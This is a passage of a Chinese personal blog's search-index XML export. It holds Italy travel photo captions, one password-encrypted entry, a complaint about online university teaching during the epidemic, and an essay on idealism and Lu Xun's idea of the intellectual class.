<h3 id="酒店在举办音乐会-2"><a class="markdownIt-Anchor" href="#酒店在举办音乐会-2"></a> <img src="/2020/02/29/1/Italy6.jpg" alt="酒店在举办音乐会" title="酒店在举办音乐会"></h3>
<h3 id="凯旋门"><a class="markdownIt-Anchor" href="#凯旋门"></a> 凯旋门</h3>
<p><img src="/2020/02/29/1/Italy7.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="罗马斗兽场外部"><a class="markdownIt-Anchor" href="#罗马斗兽场外部"></a> 罗马斗兽场外部</h3>
<p><img src="/2020/02/29/1/Italy8.jpg" alt="罗马斗兽场外部" title="罗马斗兽场外部"></p>
<h3 id="罗马斗兽场内部"><a class="markdownIt-Anchor" href="#罗马斗兽场内部"></a> 罗马斗兽场内部</h3>
<p><img src="/2020/02/29/1/Italy9.jpg" alt="罗马斗兽场内部" title="罗马斗兽场内部"></p>
<h3 id="凯旋门正面"><a class="markdownIt-Anchor" href="#凯旋门正面"></a> 凯旋门正面</h3>
<p><img src="/2020/02/29/1/Italy10.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="西班牙广场"><a class="markdownIt-Anchor" href="#西班牙广场"></a> 西班牙广场</h3>
<p><img src="/2020/02/29/1/Italy11.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id><a class="markdownIt-Anchor" href="#"></a> </h3>
<p><img src="/2020/02/29/1/Italy12.jpg" alt="西班牙广场" title="西班牙广场"></p>
<p><img src="/2020/02/29/1/Italy13.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id="梵蒂冈"><a class="markdownIt-Anchor" href="#梵蒂冈"></a> 梵蒂冈</h3>
<p><img src="/2020/02/29/1/Italy14.jpg" alt="梵蒂冈" title="梵蒂冈"></p>
<h3 id="瑞士雇佣兵"><a class="markdownIt-Anchor" href="#瑞士雇佣兵"></a> 瑞士雇佣兵</h3>
<p><img src="/2020/02/29/1/Italy15.jpg" alt="瑞士雇佣兵" title="瑞士雇佣兵"></p>
<p><img src="/2020/02/29/1/Italy16.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy17.jpg" alt></p>
<h3 id="巨大的花园"><a class="markdownIt-Anchor" href="#巨大的花园"></a> 巨大的花园</h3>
<p><img src="/2020/02/29/1/Italy18.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy19.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy20.jpg" alt></p>
<h3 id="佛罗伦萨"><a class="markdownIt-Anchor" href="#佛罗伦萨"></a> 佛罗伦萨</h3>
<p><img src="/2020/02/29/1/Italy21.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy22.jpg" alt></p>
<h3 id="威尼斯"><a class="markdownIt-Anchor" href="#威尼斯"></a> 威尼斯</h3>
<p><img src="/2020/02/29/1/Italy23.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/1/Italy24.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/1/Italy25.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy26.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy27.jpg" alt></p>
<h3 id="传说中罗密欧与朱丽叶相遇的地方"><a class="markdownIt-Anchor" href="#传说中罗密欧与朱丽叶相遇的地方"></a> 传说中罗密欧与朱丽叶相遇的地方</h3>
<p><img src="/2020/02/29/1/Italy28.jpg" alt="传说中罗密欧与朱丽叶相遇的地方" title="传说中罗密欧与朱丽叶相遇的地方"></p>
]]></content>
      <categories>
        <category>旅行</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>庄颜、神仙姐姐与爱情幻想</title>
    <url>/2020/02/28/1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="19b06687cd633e9a29245b93a31ceabb917a909017b7e11b0a5f921dc9a55d94">974a10538692d123775750fa4cd57060c51ca00670dff0798dcebf9171161591d27e6e9ffde021ff9e7f762d001aa4c27698281cb13fe572aa3aba24792fe2e1ac28f6bc84f9e6a559096062249f63067bf1a08f600e6bbf366793e263514fb653c919a4852a3b6ad88924bec16a1a3c8890d700437a414c80e9ead39d13934708be39fc605e6b8999688cecdc7b5e20b9ba2cf524e7851e382991355692dca0f13cc4d3402f44e3e09a9a3725ea499a614ff270d970f6662eb2e69f1ca53a06b73786a7517e74b5e926fd2f3403eb030aee5edfc98c534a7657f5decca6e517bc9ecbd33d5f30f319f92b1f16af4ba9d65d0be3edf2b007d3ca6da25ba8a8c3babe67daf7bc319d0e86ca2102332944ef8750b35e9cb3093bc9b056c16d6a69</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>人生</tag>
        <tag>杂论</tag>
      </tags>
  </entry>
  <entry>
    <title>家居学习语</title>
    <url>/2020/02/27/moan/</url>
    <content><![CDATA[<p>因为疫情的原因，我们国家的各个中学校、高等学府都开始了线上授课，即以直播或者以网课为途径进行授课。在我没开学的时候，我天真地以为，这次疫情的发展，也许会促进 教育在网络上的发展，使得我们今后的课程可以通过网络进行，由此可以扩展教育的普及度以及减少学生的教育负担。尤其是对于我这种只喜欢舒舒服服待在家里，受不了宿舍嘈杂环境的人， 简直是福音。可是当我灰溜溜地上完一周的线上课后，我才真心感觉到我那时的想法还是多么的天真。我们国家的网络教育事业，仍然是处于非常低水平，教育内容也是非常刻板与愚蠢的。</p>
<a id="more"></a>
<p>首先说我们的网课，我自己认为网课的内容简直是惨不忍睹，一套课程下来，只有一个老师在那里逐字地去念ppt，声调完全没有变化，就好像刻板的机器一样，知道的以为他在讲课，不知道的还以为 他在基督教堂里做弥撒。从他呆板的语调中我听不出这节课的任何重点。于是，在忍受了几天的课程终于受不了，就去自己看书自学，或者去其他的网站自己找课程学习。我当然并不反对每个学校录课， 为教育公开贡献一份自己的力量，不过有一句话叫做“陈力就列，不能则止”。</p>
<p>事实上，我认为一所名校，是完全有可能做好线上教育的行当的，不过我们的国情是学校都不大把教学放在心上，但偏偏又爱事事争先，看到哪个学校又推出了什么项目，我们便也想去模仿一下。 或者某个名校又有某个天才学生的加盟啦，美女教师评职称啦，学校就又会大力宣传一番，吸引看客的眼球，让一群不懂装懂的人评头论足。这些事情的发生，并非是我信口胡诌，你多少都能发现些 蛛丝马迹。</p>
<p>我是学计算机专业的，当我在网络上挑选书籍的时候，我总会挑选国外的计算机专业书籍。国内没有计算机专业书籍吗？不是！国内的计算机书籍稂莠不齐，虽然也有一些精品书籍，但大都是少数， 很多都是名词的罗列与概念的堆砌，更像是大学生毕业时写论文东抄抄西抄抄的感觉。我们的专业教材为什么如此不堪呢？是真的没有人可以写吗？并不是！我们有水平且有资格写教材的人大都是各个“名校” 的教授专家们，教育部把编写某个教材的人物分配给某个高校，学校又分配给学校内该领域的教授，但是教授呢，他可没那么多功夫写，他还要做科研呢！于是就把任务分配给自己课题下的研究生、博士生们， 研究生、博士生怎么办呢，人家还要毕业呢？可是水平不够怎么办呢？那就抄吧！那好抄抄哪，但为了避免查重，一个专题还得换着书抄，如此作为，书的质量能好得了吗？</p>
<p>我认为之所以我们国家出不了经典的教材，出不了适合国人的教育课程，根本原因就是教育体系的评判方式有问题，中国的教师只能靠科研或者搞学术获得晋升，而不能通过教课来评职称。 为什么我们中小学教育在全世界属于领先水平，但是高等教育却被诟病呢？其实质就是中小学教育教师是全职教课的，而在高等学府教师的晋升之道就只有搞学术一条，这样教师又怎能有大把精力来考虑 教学问题呢？</p>
<p>还记得14年的时候四川大学历史讲师周鼎发的那篇<a href="solo.html">《自白书》</a>吗？若非如此，教授们又怎会将自己“著作等身”的东西弃如敝履呢？</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>理想的知识阶级</title>
    <url>/2020/02/27/ideal-political/</url>
    <content><![CDATA[<p>我一直认为自己是一个理想主义者，我喜欢读历史，读文学，喜欢听音乐，我喜欢同别人交谈却很少可以找到知心的人，我把这件事归于我的理想化， 我对于我的理想充满了向往，却又不断地做出妥协，虽然如今我认为“妥协”是人在社会上生存的本能,却又不甘心去做一个永远“妥协”的人。</p>
<a id="more"></a>
<p>我在这个寒假看了很多电影，尤其是韩国电影，像李沧东的《燃烧》、《薄荷糖》，奉俊昊的《杀人回忆》、《寄生虫》,还有像《辩护人》等， 这些电影无论是从艺术处理还是从深度上自然都是极好的，尤其是对于韩国民主化进程的反思以及对于那代人所带来的灾难性发展。可我认为， 仅仅有道德上的批判是不够的，缓慢地变革是不彻底的，光荣革命、辛亥革命都是阉割了的革命。</p>
<p>前今天和朋友聊人生的时候，我就说：“等我以后赚够了钱，就隐居山林，开个咖啡馆或者书店，做自己喜欢做的事情，如果还有余力的话，就去 旅游，见识世界的山水人情。”然后，我又自嘲地说，我是不是太过理想了，在一个社会中，什么人可以自由自在地过完自己的一生呢？每个人都要受社会、 家庭、欲望等等因素的羁绊，自古皆然。也许当我有幸可以达到我现在所需要的条件的时候，我就又往更远的地方看了呢。</p>
<p>近些日子来，中国爆发了数十年来从未见过的“瘟疫”，我看到了许许多多丑恶与善良的事情，也听到了消极或积极的声音。我不对于这些事情予以置评， 因为我从未亲身经历过这些事情，而没有经历过同样事情的人是没有资格对一件事情发出评论的；我也不是批评家，我没有那么好的文笔和蛊惑性，我只是想把 我看到的，思考过的，读过的，说过的记录下来，呈现给大家，或许你会认为这篇文章杂乱无章，一点没有可读性。我认为这本身是对的，因为事情就是这么乱， 我只是把我想到的全部写出来。当我看历史的时候，我会感到痛心，因为我看到了在历史舞台上叱咤风云的人物竟然也会如此平庸，我们也一样，如此平庸。</p>
<p>前些日子读到鲁迅先生的一篇杂文<a href="https://www.marxists.org/chinese/reference-books/luxun/24/045.htm" target="_blank" rel="noopener">《关于知识阶级》</a> ，说实话，我真的觉得这是我本年度读的，甚至可以说是有生以来读的最优秀的杂文，在这里他提出了一个“真的知识阶级”，并且做了两点界定，“他与平民接近，或 自身就是平民”，“因此他确能为平民抱不平，把平民的苦痛告诉大众”；“他们对社会永不会满意的，所感受的永远是痛苦，所看到的永远是缺点”，它所强调的是，真正 的知识阶级，是要永远站到平民阶级这边的，所谓平民阶级，不是某一个人，也不是某一个团体，因为某一个人或者某一个团体，都有可能在历史的进程中实现阶级的转换， 而真正的知识阶级，则是要坚持拥护在易受到倾轧的团体的这边，否则，就会变成“革命奸商”，“革命小贩”，“革命工头”与“奴隶总管”。鲁迅对被压迫的民众的反抗的合理性， 是从不怀疑的，他有句名言，“人被压迫了，为什么不斗争？”，正是怀着这种对于底层阶级深刻的同情，他后来对当时中国唯一反抗国民党一党专政的共产党领导的工农革命运动， 采取同情与支持的态度，并且与共产党人合作，共同发起左翼文艺运动，都是一种自觉的选择。当他目睹年轻的革命文学者为了自己的争取民众解放的信仰不惜流血牺牲，更是用 少有的热情由衷地赞叹“无产阶级革命文学和革命的劳苦大众是在受一样的压迫，一样的残杀，做一样的战斗，有一样的运命”，这与前述站在普通民众这一边，做永远的革命者的“ 真的知识阶级”的定位，是完全一致的。或者可以说，一个真的知识阶级几乎是必然要做这样的选择的。</p>
<p>然而值得一提的是关于“党的左翼”与“鲁迅左翼”，到了三十年代中后期，面对日本侵略，中国共产党改变策略，主张建立民族统一战线，在文学上，提出“国防文学”的口号。 鲁迅对“国防文学”口号并不反对，但是有点担心，如果过分地强调国家利益至上，会不会掩盖或者美化国民党一党专政的统治？会不会因此损害工农民众的基本利益？他有这样的担心，就提出 另外一个口号“民族革命时代的大众文学”，强调战争的革命性，要维护大众的利益，就要坚持他的左翼立场。</p>
<p>另一件事是许广平在1927年国共合作时，曾经有过加入国民党的想法，她征求鲁迅的意见，鲁迅就对她说，一个政党是要靠组织力量来实现它的理想、信念的，所以政党是要强调纪律性的， 要求党员绝对服从政党的决议，有的时候就要牺牲个人意志。因此要求你入党，就必须想清楚，你是否愿意在一定条件下牺牲个人意志，如果愿意就加入，如果不愿意，要保持个人意志和独立性， 就别加入。这是鲁迅的个体精神，这也是鲁迅左翼与党的左翼的根本性分歧。</p>
<p>所以我们现在回头来看看，什么是真正的理想主义？像我从前所想那样，只顾着自己的自由与快活，大概是算不上真正的理想主义的，因为如此的“理想”，是无法去实现的。真正的理想主义， 更是应当去立足于实际，对于一切具有批判性思维与探索欲，这是“理想的知识阶级”。再理想的东西，也应当有其实际意义与实际用处，而非一味的空穴来风。</p>
<p>我读《北洋军阀史》的时候，就发现孙文这个真正的理想主义者，却被整个大环境给搞偏了，以至于在袁世凯在北京就任大总统后，孙文因为太过理想而被孤立，整个同盟会也土崩瓦解，形成了 国民党、民主党、共和党等等，尤其自从唐绍仪内阁瓦解后，原来的政党内阁成为了内阁政党，从而变成了袁世凯攫取权力的工具。这是因为辛亥革命从一开始便是不彻底的，当革命军达到一定规模时， 同盟会成员想的不是如何从内部推举首领，反而邀请封建名流及政治家如黎元洪等担任首领，这便是没有真正地深入到国民中去。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
      </tags>
  </entry>
</search>
